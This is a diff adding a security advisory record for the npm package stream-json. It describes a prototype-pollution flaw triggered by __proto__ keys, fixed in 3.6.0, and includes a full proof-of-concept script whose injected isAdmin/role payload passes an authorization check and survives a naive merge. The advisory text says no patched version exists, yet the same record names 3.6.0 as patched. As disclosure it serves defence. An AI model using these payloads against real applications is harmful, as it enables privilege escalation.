@@ -1,0 +1,59 @@
+{
+  "Severity": "MODERATE",
+  "UpdatedAt": "2026-10-05T22:49:20Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "stream-json"
+  },
+  "Advisory": {
+    "DatabaseId": 506500,
+    "Id": "GSA_kwCzR0hTQS1tanc2LTRqajYtMzNoY84AB7qE",
+    "GhsaId": "GHSA-mjw6-4jj6-33hc",
+    "References": [
+      {
+        "Url": "https://github.com/uhop/stream-json/security/advisories/GHSA-mjw6-4jj6-33hc"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-104183"
+      },
+      {
+        "Url": "https://github.com/uhop/stream-json/commit/2f2d35bbb547306991ded6487a279154d865a358"
+      },
+      {
+        "Url": "https://github.com/uhop/stream-json/releases/tag/3.6.0"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-mjw6-4jj6-33hc"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-mjw6-4jj6-33hc"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-104183"
+      }
+    ],
+    "Description": "### Summary\nA prototype-pollution vulnerability in stream-json lets attacker-controlled JSON replace a parsed object's prototype.\n\n### Details\nThe streaming JSON parser (StreamValues/StreamObject/jsonc variants) writes keys via plain assignment, so a __proto__ key replaces the parsed object's prototype with attacker-controlled content (verified 3.5.0 npm latest; native JSON.parse twin control stays clean). Parsing untrusted JSON is the contract. Assembler in Assembler.js.\n\n### PoC\n\nRun:\n```bash\nnode poc-stream-json-proto-injection.mjs\n```\n\nFull proof-of-concept source (poc-stream-json-proto-injection.mjs):\n```js\n// stream-json v3.5.0 (npm latest) — local [[Prototype]] replacement via `__proto__` keys\n// Class: prototype injection in a JSON deserializer (jsonparse/bser/jsonc-parser/plist family)\n// Root cause: Assembler builds every object as a plain `Object` and writes\n//   `this.current[this.key] = value` (src/core/assembler.js:160,180 — plain assignment,\n//   ToPropertyKey → inherited Object.prototype __proto__ setter fires)\n// Spec baseline: JSON.parse (CreateDataProperty) → own data property, no prototype change\n// Run:  node poc-stream-json-proto-injection.mjs   (from C:/Users/rncb0/AppData/Local/Temp/0day/sj-lab)\nimport { parser } from 'stream-json';\nimport jsoncParser from 'stream-json/jsonc/Parser.js';\nimport { streamValues } from 'stream-json/streamers/stream-values.js';\nimport { streamObject } from 'stream-json/streamers/stream-object.js';\nimport { Readable } from 'node:stream';\n\nconst sv = (input, P = parser) =\u003e new Promise((res, rej) =\u003e {\n  const vals = [];\n  Readable.from([input]).pipe(P.asStream()).pipe(streamValues.asStream())\n    .on('data', d =\u003e vals.push(d.value)).on('end', () =\u003e res(vals)).on('error', rej);\n});\nconst so = (input) =\u003e new Promise((res, rej) =\u003e {\n  const out = {};\n  Readable.from([input]).pipe(parser.asStream()).pipe(streamObject.asStream())\n    .on('data', d =\u003e { out[d.key] = d.value; }).on('end', () =\u003e res(out)).on('error', rej);\n});\n\nlet pass = 0, fail = 0;\nconst check = (name, cond) =\u003e { if (cond) { pass++; console.log(`  PASS  ${name}`); } else { fail++; console.log(`  FAIL  ${name}`); } };\n\nconst INPUT = '{\"__proto__\":{\"isAdmin\":true,\"role\":\"superuser\"},\"name\":\"bob\",\"age\":30}';\nconst baseline = JSON.parse(INPUT);\nconst sv1 = (await sv(INPUT))[0];\nconst so1 = await so(INPUT);\nconst jc1 = (await sv(INPUT, jsoncParser))[0];\nconst nested = (await sv('{\"user\":{\"__proto__\":{\"isAdmin\":true},\"name\":\"alice\"}}'))[0].user;\nconst arrProto = (await sv('{\"__proto__\":[\"isAdmin\",\"role\"],\"name\":\"bob\"}'))[0];\nconst prim = (await sv('{\"__proto__\":\"x\",\"name\":\"bob\"}'))[0];\nconst ctor = (await sv('{\"constructor\":{\"prototype\":{\"polluted\":1}},\"name\":\"bob\"}'))[0];\n\nconsole.log('== A. CORE VECTOR: __proto__ key → parsed object [[Prototype]] replaced (read-through injection) ==');\ncheck('StreamValues: Object.keys hides __proto__/isAdmin ([\"name\",\"age\"])', JSON.stringify(Object.keys(sv1)) === '[\"name\",\"age\"]');\ncheck('StreamValues: JSON.stringify hides injected props ({\"name\":\"bob\",\"age\":30})', JSON.stringify(sv1) === '{\"name\":\"bob\",\"age\":30}');\ncheck('StreamValues: hasOwnProperty(isAdmin) === false (own-key allowlists pass)', !Object.prototype.hasOwnProperty.call(sv1, 'isAdmin'));\ncheck('StreamValues: obj.isAdmin === true (INHERITED read-through)', sv1.isAdmin === true);\ncheck('StreamValues: obj.role === \"superuser\"', sv1.role === 'superuser');\ncheck('StreamValues: [[Prototype]] is NON-plain', Object.getPrototypeOf(sv1) !== Object.prototype);\ncheck('StreamObject: same read-through (obj.isAdmin === true)', so1.isAdmin === true \u0026\u0026 Object.keys(so1).length === 2);\ncheck('jsonc parser (comments variant): same read-through', jc1.isAdmin === true \u0026\u0026 JSON.stringify(Object.keys(jc1)) === '[\"name\",\"age\"]');\ncheck('NESTED: user.isAdmin === true, own keys [\"name\"]', nested.isAdmin === true \u0026\u0026 JSON.stringify(Object.keys(nested)) === '[\"name\"]');\n\nconsole.log('== B. SPEC BASELINE (control): JSON.parse makes __proto__ an OWN data key ==');\ncheck('JSON.parse: own __proto__ key visible', Object.keys(baseline).includes('__proto__'));\ncheck('JSON.parse: isAdmin undefined (no read-through)', baseline.isAdmin === undefined);\ncheck('JSON.parse: [[Prototype]] stays plain', Object.getPrototypeOf(baseline) === Object.prototype);\n\nconsole.log('== C. VARIANT: array-valued __proto__ → parsed object becomes array-like ==');\ncheck('proto is attacker Array (av[0]==\"isAdmin\", av[1]==\"role\")', arrProto[0] === 'isAdmin' \u0026\u0026 arrProto[1] === 'role');\ncheck('legit data lands at attacker-indexed position (av[2]==\"bob\", length 3)', arrProto[2] === 'bob' \u0026\u0026 arrProto.length === 3);\n\nconsole.log('== D. FAIL-CLOSED CONTROLS ==');\ncheck('primitive __proto__ value: no-op, plain proto (spec semantics)', Object.getPrototypeOf(prim) === Object.prototype \u0026\u0026 Object.keys(prim).length === 1);\ncheck('constructor key: harmless own prop', Object.prototype.hasOwnProperty.call(ctor, 'constructor') \u0026\u0026 ({}).polluted === undefined);\ncheck('NO GLOBAL Object.prototype pollution', ({}).polluted === undefined \u0026\u0026 ({}).isAdmin === undefined);\n\nconsole.log('== E. IMPACT: auth/flag decisions read attacker values; hardened-merge bypass ==');\nconst authorize = o =\u003e o.isAdmin === true \u0026\u0026 o.role === 'superuser';\ncheck('authorize(stream-json obj) === true (GRANT)', authorize(sv1) === true);\ncheck('authorize(JSON.parse twin) === false (DENY — control)', authorize(baseline) === false);\nconst target = { theme: 'light' };\nfor (const k in sv1) target[k] = sv1[k];        // typical naive/hardened merge (for-in)\ncheck('merge copies INHERITED isAdmin as OWN prop onto target (skip-__proto__ sanitizer defeated)',\n      Object.prototype.hasOwnProperty.call(target, 'isAdmin') \u0026\u0026 target.isAdmin === true);\nconst t2 = { theme: 'light' };\nfor (const k in baseline) t2[k] = baseline[k];   // JSON.parse twin stays clean\ncheck('merge of JSON.parse twin has NO isAdmin (control)', !Object.prototype.hasOwnProperty.call(t2, 'isAdmin'));\n\nconsole.log(`\\nRESULT: ${pass} PASS / ${fail} FAIL`);\nprocess.exit(fail ? 1 : 0);\n\n```\n\nObserved output (verbatim, Node 24.15.0, Windows):\n```\nRESULT: 21 PASS / 0 FAIL\n```\n\n### Impact\nPrototype pollution (CWE-1321). Applications parsing attacker-influenced streaming JSON can have authorization checks read attacker-controlled values. Affects stream-json \u003c= 3.5.0; no patched version exists.\n\n---\n\n# Maintainer note on scope\n\nThe attack vector is local — stream-json's documented input is data the user owns (database dumps, exports, logs); it is not designed for JSON from the open internet, and the docs now say so. The parsed object's prototype was replaced (never the global `Object.prototype`); `\"__proto__\": null` additionally strips `Object.prototype` from the parsed object, so ordinary consumer code calling `hasOwnProperty()` throws. `Assembler` and `FlexAssembler` now create an own data property for a `__proto__` key, exactly as `JSON.parse` does.\n\n---",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-10-05T22:49:19Z",
+    "Severity": "MODERATE",
+    "Summary": "stream-json has a prototype pollution issue: Assembler writes this.current[this.key] on plain objects",
+    "UpdatedAt": "2026-10-05T22:49:20Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 5.1,
+      "VectorString": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "3.6.0"
+      },
+      "VulnerableVersionRange": "\u003c 3.6.0"
+    }
+  ]
+}
